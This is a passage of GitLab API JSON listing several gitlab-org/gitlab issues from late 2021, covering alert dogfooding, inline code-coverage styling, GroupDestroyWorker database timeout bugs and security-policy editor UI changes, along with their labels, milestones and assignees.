Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n* [Eddie (Content Editor)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#eddie-content-editor)\n--\u003e\n\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n\n### Metrics \n\n\u003c!-- How are you going to track uage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\nIncrease adoption of alerts, in particular Monitor - AMAU - Alerts Active Users","state":"closed","created_at":"2021-11-19T21:38:41.382Z","updated_at":"2022-03-16T00:09:23.272Z","closed_at":"2022-02-23T16:28:26.525Z","closed_by":{"id":9304687,"username":"abellucci","name":"Alana Bellucci","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9304687/avatar.png","web_url":"https://gitlab.com/abellucci"},"labels":["Category:Incident Management","Dogfooding","Dogfooding::Build in GitLab","GitLab Core","Monitor CM","SUS::Impacting","Technical Writing","UI text","UX","backend","devops::monitor","feature::enhancement","frontend","group::respond","missed:14.8","release post item::in review","section::ops","severity::4","type::feature","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":3945330,"username":"seanarnold","name":"Sean Arnold","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0bda1b68a7462959aa82bb63bda9b80?s=80\u0026d=identicon","web_url":"https://gitlab.com/seanarnold"}],"author":{"id":9304687,"username":"abellucci","name":"Alana Bellucci","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9304687/avatar.png","web_url":"https://gitlab.com/abellucci"},"type":"ISSUE","assignee":{"id":3945330,"username":"seanarnold","name":"Sean Arnold","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0bda1b68a7462959aa82bb63bda9b80?s=80\u0026d=identicon","web_url":"https://gitlab.com/seanarnold"},"user_notes_count":29,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346171","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":4,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346171","notes":"https://gitlab.com/api/v4/projects/278964/issues/346171/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346171/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346171","relative":"#346171","full":"gitlab-org/gitlab#346171"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7022,"epic":{"id":378341,"iid":7022,"title":"Dogfooding Alerts","url":"/groups/gitlab-org/-/epics/7022","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97652674,"iid":346167,"project_id":278964,"title":"Inline code coverage: Make no-coverage lines more prominent than covered lines","description":"### Problem to solve\n\nIn the merge request diff, when displaying coverage data as red/green lines next to the line numbers, lines without coverage are less prominent than lines with coverage. In most cases where coverage data would be helpful to see next to the merge request diff, it is more important to see which lines **don't** have coverage.\n\n### Proposal\n\nSwap the widths of the inline coverage lines (`2px` and `4px`):\n\n| current | proposal |\n| ------ | ------ |\n| ![Screen_Shot_2021-11-19_at_14.27.24](/uploads/7d377f7b4a82f7428ec331ff792c4cbc/Screen_Shot_2021-11-19_at_14.27.24.png) | ![Screen_Shot_2021-11-19_at_14.28.02](/uploads/e327cf1d92273615dfaed23de9c1554a/Screen_Shot_2021-11-19_at_14.28.02.png) |\n\nThe lines should remain different widths in order to make them distinguishable based on something more than just color. The current colors and line widths were established in https://gitlab.com/gitlab-org/gitlab/-/issues/278469 / https://gitlab.com/gitlab-org/gitlab/-/merge_requests/49724.\n\n### Intended users\n\n\u003c!-- Personas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/  --\u003e\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer) would like to see more prominent warnings about lines without test coverage when writing and reviewing merge requests\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2021-11-19T21:32:49.787Z","updated_at":"2022-02-18T18:27:41.605Z","closed_at":"2022-02-17T07:00:09.829Z","closed_by":{"id":10713832,"username":"MMSandal","name":"Mustafa Mert  Sandal","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c6cb33cf1545b5ed9bbd9b415b0142f4?s=80\u0026d=identicon","web_url":"https://gitlab.com/MMSandal"},"labels":["Category:Code Testing and Coverage","UX","accessibility::high","devops::verify","feature::enhancement","frontend","good for new contributors","group::pipeline insights","section::ops","severity::2","type::feature","workflow::in review"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[{"id":10713832,"username":"MMSandal","name":"Mustafa Mert  Sandal","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c6cb33cf1545b5ed9bbd9b415b0142f4?s=80\u0026d=identicon","web_url":"https://gitlab.com/MMSandal"}],"author":{"id":3374280,"username":"mfluharty","name":"Miranda Fluharty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3374280/avatar.png","web_url":"https://gitlab.com/mfluharty"},"type":"ISSUE","assignee":{"id":10713832,"username":"MMSandal","name":"Mustafa Mert  Sandal","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c6cb33cf1545b5ed9bbd9b415b0142f4?s=80\u0026d=identicon","web_url":"https://gitlab.com/MMSandal"},"user_notes_count":11,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346167","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346167","notes":"https://gitlab.com/api/v4/projects/278964/issues/346167/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346167/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346167","relative":"#346167","full":"gitlab-org/gitlab#346167"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97652672,"iid":346166,"project_id":278964,"title":"GroupDestroyWorker failure - merge_request_diff_commits statement timeout","description":"\u003c!--\nTriage of infradev Issues is desired to occur asynchronously.\nFor maximum efficiency, please ensure the following, so that your infradev issues can gain maximum traction.\n\nhttps://about.gitlab.com/handbook/engineering/workflow/#a-guide-to-creating-effective-infradev-issues\n--\u003e\n\n## Summary\n\u003c!--\nClearly state the scope of the problem, and how it affects GitLab.com\n--\u003e\n\nRelated to https://gitlab.com/groups/gitlab-org/-/epics/7171\n\nOn Gitlab.com, `GroupDestroyWorker` sometimes fails due to a non-deleteable project. The failures are tracked in this [Kibana dashboard](https://log.gprd.gitlab.net/app/discover#/?_g=(filters:!(),refreshInterval:(pause:!t,value:0),time:(from:now-2d,to:now))\u0026_a=(columns:!(json.error_class,json.error_message,json.error_backtrace),filters:!(('%24state':(store:appState),meta:(alias:!n,disabled:!f,index:AWNABDRwNDuQHTm2tH6l,key:json.class.keyword,negate:!f,params:(query:GroupDestroyWorker),type:phrase),query:(match_phrase:(json.class.keyword:GroupDestroyWorker))),('%24state':(store:appState),meta:(alias:!n,disabled:!f,index:AWNABDRwNDuQHTm2tH6l,key:json.job_status,negate:!f,params:(query:fail),type:phrase),query:(match_phrase:(json.job_status:fail)))),index:AWNABDRwNDuQHTm2tH6l,interval:auto,query:(language:lucene,query:''),sort:!())). \n\nWe have narrowed down the failures to ten distinct `Project#delete_error` values. This issue deals with project deletion errors due to \n\n```\nPG::QueryCanceled: ERROR:  canceling statement due to statement timeout\nCONTEXT:  SQL statement \"DELETE FROM ONLY \"public\".\"merge_request_diff_commits\" WHERE $1 OPERATOR(pg_catalog.=) \"merge_request_diff_id\"\"\n```\n\nThe full list of `delete_errors` can be found here: https://gitlab.com/gitlab-org/gitlab/-/issues/342692#note_737332055\n\n## Impact\n\u003c!--\n- Quantify the effect of the problem to help ensure that correct prioritization occurs.\n- Include costs to availability. The Incident Budget Explorer dashboard can help here.\n- Include the number of times alerts have fired owing to the problem, how much time was spent dealing with the problem, and how many people were involved.\n- Link to affected incidents, and cross-reference them as related issues.\n- Include screenshots of visualization from Grafana or Kibana.\n- Always include a permalink to the source of the screenshot so that others can investigate further.\n--\u003e\n\n\nIn the past week, `GroupDestroyWorker` has failed ~1500 times due to 138 projects attempting to be deleted over and over again. \n\n\n## Recommendation\n\u003c!--\nProvide a clear, unambiguous, self-contained solution to the problem.\n--\u003e\n\n\n## Verification\n\u003c!--\nProvide a method for validating that the original issue still exists.\n\nHaving a way of checking validity can save on a great deal of back-and-forth discussion between Infradev Triage participants including Engineering Managers, Directors and Product Managers and make space for other non-resolved issues to get scheduled sooner.\n\nIdeally, provide a link to a Thanos query or an ELK query and clear instructions on how to interpret the results to determine whether the problem is still occurring.\n--\u003e\n\n\n\u003c!--\nWorkflow and other relevant labels\n\nSee also:\n- https://about.gitlab.com/handbook/engineering/quality/issue-triage/#availability\n- https://about.gitlab.com/handbook/product/categories/\n- https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/data/stages.yml\n--\u003e","state":"closed","created_at":"2021-11-19T21:32:35.251Z","updated_at":"2022-02-23T19:46:54.134Z","closed_at":"2022-01-30T20:17:05.924Z","closed_by":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"labels":["Eng-Consumer::Infrastructure","Eng-Producer::Development","Engineering Allocation","automation:infradev-missing-labels","backend","devops::create","group::code review","infradev","missed:14.6","section::dev","severity::4","type::bug"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"}],"author":{"id":5966677,"username":"serenafang","name":"Serena Fang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5966677/avatar.png","web_url":"https://gitlab.com/serenafang"},"type":"ISSUE","assignee":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"user_notes_count":31,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346166","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346166","notes":"https://gitlab.com/api/v4/projects/278964/issues/346166/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346166/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346166","relative":"#346166","full":"gitlab-org/gitlab#346166"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7171,"epic":{"id":390210,"iid":7171,"title":"On GitLab.com, the `GroupDestroyWorker` sidekiq job has about a 10% failure rate","url":"/groups/gitlab-org/-/epics/7171","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97652615,"iid":346164,"project_id":278964,"title":"Follow-up: Allow for users to share which steps they are on via URL","description":"## Why are we doing this work\n- a user will want to share the direct link to creating a certain policy type\n\n\n## Relevant links\n- [Design Issue](https://gitlab.com/groups/gitlab-org/-/epics/7147)\n\n\n## Non-functional requirements\n- [ ] Documentation:\n- [ ] Testing:\n\n## Implementation plan\n- [ ] ~frontend TBD","state":"closed","created_at":"2021-11-19T21:30:16.505Z","updated_at":"2022-04-11T03:34:19.855Z","closed_at":"2022-04-06T16:47:45.433Z","closed_by":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"labels":["Enterprise Edition","GitLab Ultimate","auto updated","devops::govern","frontend","frontend-weight::3","group::security policies","section::sec","type::feature","workflow::refinement"],"milestone":{"id":1212252,"iid":48,"group_id":9970,"title":"Next 1-3 releases","description":"Issues which are not quite ready to schedule, but should be considered as part of the near-term roadmap.","state":"active","created_at":"2020-03-26T20:39:10.889Z","updated_at":"2020-03-26T20:39:10.889Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/48"},"assignees":[],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":null,"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346164","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346164","notes":"https://gitlab.com/api/v4/projects/278964/issues/346164/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346164/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346164","relative":"#346164","full":"gitlab-org/gitlab#346164"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7147,"epic":{"id":388086,"iid":7147,"title":"Help users select an initial policy type","url":"/groups/gitlab-org/-/epics/7147","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97652612,"iid":346163,"project_id":278964,"title":"GroupDestroyWorker failure - deployment_merge_requests statement timeout","description":"\u003c!--\nTriage of infradev Issues is desired to occur asynchronously.\nFor maximum efficiency, please ensure the following, so that your infradev issues can gain maximum traction.\n\nhttps://about.gitlab.com/handbook/engineering/workflow/#a-guide-to-creating-effective-infradev-issues\n--\u003e\n\n## Summary\n\u003c!--\nClearly state the scope of the problem, and how it affects GitLab.com\n--\u003e\n\nRelated to https://gitlab.com/groups/gitlab-org/-/epics/7171\n\nOn Gitlab.com, `GroupDestroyWorker` sometimes fails due to a non-deleteable project. The failures are tracked in this [Kibana dashboard](https://log.gprd.gitlab.net/app/discover#/?_g=(filters:!(),refreshInterval:(pause:!t,value:0),time:(from:now-2d,to:now))\u0026_a=(columns:!(json.error_class,json.error_message,json.error_backtrace),filters:!(('%24state':(store:appState),meta:(alias:!n,disabled:!f,index:AWNABDRwNDuQHTm2tH6l,key:json.class.keyword,negate:!f,params:(query:GroupDestroyWorker),type:phrase),query:(match_phrase:(json.class.keyword:GroupDestroyWorker))),('%24state':(store:appState),meta:(alias:!n,disabled:!f,index:AWNABDRwNDuQHTm2tH6l,key:json.job_status,negate:!f,params:(query:fail),type:phrase),query:(match_phrase:(json.job_status:fail)))),index:AWNABDRwNDuQHTm2tH6l,interval:auto,query:(language:lucene,query:''),sort:!())). \n\nWe have narrowed down the failures to ten distinct `Project#delete_error` values. This issue deals with project deletion errors due to \n\n```\nPG::QueryCanceled: ERROR:  canceling statement due to statement timeout\nCONTEXT:  SQL statement \"DELETE FROM ONLY \"public\".\"deployment_merge_requests\" WHERE $1 OPERATOR(pg_catalog.=) \"merge_request_id\"\"\n```\n\nThe full list of `delete_errors` can be found here: https://gitlab.com/gitlab-org/gitlab/-/issues/342692#note_737332055\n\n## Impact\n\u003c!--\n- Quantify the effect of the problem to help ensure that correct prioritization occurs.\n- Include costs to availability. The Incident Budget Explorer dashboard can help here.\n- Include the number of times alerts have fired owing to the problem, how much time was spent dealing with the problem, and how many people were involved.\n- Link to affected incidents, and cross-reference them as related issues.\n- Include screenshots of visualization from Grafana or Kibana.\n- Always include a permalink to the source of the screenshot so that others can investigate further.\n--\u003e\n\nIn the past week, `GroupDestroyWorker` has failed ~1500 times due to 138 projects attempting to be deleted over and over again. \n\n\n## Recommendation\n\u003c!--\nProvide a clear, unambiguous, self-contained solution to the problem.\n--\u003e\n\n\n## Verification\n\u003c!--\nProvide a method for validating that the original issue still exists.\n\nHaving a way of checking validity can save on a great deal of back-and-forth discussion between Infradev Triage participants including Engineering Managers, Directors and Product Managers and make space for other non-resolved issues to get scheduled sooner.\n\nIdeally, provide a link to a Thanos query or an ELK query and clear instructions on how to interpret the results to determine whether the problem is still occurring.\n--\u003e\n\n\n\u003c!--\nWorkflow and other relevant labels\n\nSee also:\n- https://about.gitlab.com/handbook/engineering/quality/issue-triage/#availability\n- https://about.gitlab.com/handbook/product/categories/\n- https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/data/stages.yml\n--\u003e","state":"closed","created_at":"2021-11-19T21:30:12.543Z","updated_at":"2022-02-10T16:49:21.734Z","closed_at":"2022-01-10T09:26:47.254Z","closed_by":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"labels":["Category:Source Code Management","Deliverable","Eng-Consumer::Infrastructure","Eng-Producer::Development","Engineering Allocation","devops::create","group::source code","infradev","missed-deliverable","missed:14.6","priority::2","section::dev","severity::2","type::bug","workflow::in dev"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"}],"author":{"id":5966677,"username":"serenafang","name":"Serena Fang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5966677/avatar.png","web_url":"https://gitlab.com/serenafang"},"type":"ISSUE","assignee":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346163","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346163","notes":"https://gitlab.com/api/v4/projects/278964/issues/346163/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346163/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346163","relative":"#346163","full":"gitlab-org/gitlab#346163"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7171,"epic":{"id":390210,"iid":7171,"title":"On GitLab.com, the `GroupDestroyWorker` sidekiq job has about a 10% failure rate","url":"/groups/gitlab-org/-/epics/7171","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97652573,"iid":346162,"project_id":278964,"title":"Create Policy Type Selection Page","description":"## Why are we doing this work\n- the current policy type selection is not emphasized enough; it needs to be clear to the user that they can change the policy type\n\n\n## Relevant links\n- [Design Issue](https://gitlab.com/groups/gitlab-org/-/epics/7147)\n\n\n## Non-functional requirements\n- [ ] Documentation:\n- [ ] Testing:\n\n## Implementation plan\n- [ ] ~frontend Use [pajamas cards](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-card--default)\n  - selection of a type navigates the user to the policy editor for that policy type\n  - hide this selection page until https://gitlab.com/gitlab-org/gitlab/-/issues/346161","state":"closed","created_at":"2021-11-19T21:28:40.426Z","updated_at":"2022-04-18T07:03:40.191Z","closed_at":"2022-03-31T14:36:45.427Z","closed_by":{"id":5535246,"username":"svedova","name":"Savas Vedova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535246/avatar.png","web_url":"https://gitlab.com/svedova"},"labels":["Deliverable","Enterprise Edition","GitLab Ultimate","auto updated","devops::govern","frontend","frontend-weight::5","group::security policies","missed-deliverable","missed:14.8","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":5535246,"username":"svedova","name":"Savas Vedova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535246/avatar.png","web_url":"https://gitlab.com/svedova"}],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":{"id":5535246,"username":"svedova","name":"Savas Vedova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535246/avatar.png","web_url":"https://gitlab.com/svedova"},"user_notes_count":60,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346162","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346162","notes":"https://gitlab.com/api/v4/projects/278964/issues/346162/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346162/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346162","relative":"#346162","full":"gitlab-org/gitlab#346162"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7147,"epic":{"id":388086,"iid":7147,"title":"Help users select an initial policy type","url":"/groups/gitlab-org/-/epics/7147","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97652548,"iid":346161,"project_id":278964,"title":"Create Breadcrumbs for policy type selection and policy creation","description":"## Why are we doing this work\n- the current policy type selection is not emphasized enough; it needs to be clear to the user that they can change the policy type\n\n## Relevant links\n- [Design Issue](https://gitlab.com/groups/gitlab-org/-/epics/7147)\n\n## Non-functional requirements\n- [ ] Documentation:\n- [ ] Testing:\n\n## Implementation plan\n- [ ] Update page header of New/Edit pages \n  - `New \u003cPOLICY_TYPE\u003e policy`\n  - `Edit \u003cPOLICY_TYPE\u003e policy`\n- [ ] ~~Use [pajamas breadcrumbs](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-breadcrumb--default) to create new workflow~~ Use [pajamas path](https://design.gitlab.com/components/path) to create new workflow\n  - Remove old policy type selection dropdown\n- [ ] Disable `Step 1` breadcrumb when editing an existing policy and show a tooltip explaining why\n  - `Policy type cannot be changed after a policy has been created. Create a new policy if needed.`","state":"closed","created_at":"2021-11-19T21:27:49.706Z","updated_at":"2022-03-01T21:49:43.761Z","closed_at":"2022-02-15T10:38:26.042Z","closed_by":{"id":5535246,"username":"svedova","name":"Savas Vedova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535246/avatar.png","web_url":"https://gitlab.com/svedova"},"labels":["Enterprise Edition","GitLab Ultimate","[deprecated] Accepting merge requests","auto updated","devops::govern","frontend","frontend-weight::3","group::security policies","missed:14.7","section::sec","type::feature","workflow::ready for development"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":null,"user_notes_count":24,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346161","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346161","notes":"https://gitlab.com/api/v4/projects/278964/issues/346161/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346161/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346161","relative":"#346161","full":"gitlab-org/gitlab#346161"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7147,"epic":{"id":388086,"iid":7147,"title":"Help users select an initial policy type","url":"/groups/gitlab-org/-/epics/7147","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97652546,"iid":346160,"project_id":278964,"title":"Update Scan Execution Policy Editor `Create` button","description":"## Why are we doing this work\n- users are confused about what happens when they click the button to create a scan execution policy\n\n\n## Relevant links\n![Design](https://gitlab.com/groups/gitlab-org/-/uploads/274dc3c42634c5ce02bf7bde275dc3bb/step2-new-policy.png)\n\n\n## Non-functional requirements\n- [x] Documentation:\n- [x] Testing:\n\n## Implementation plan\n- [x] ~frontend change 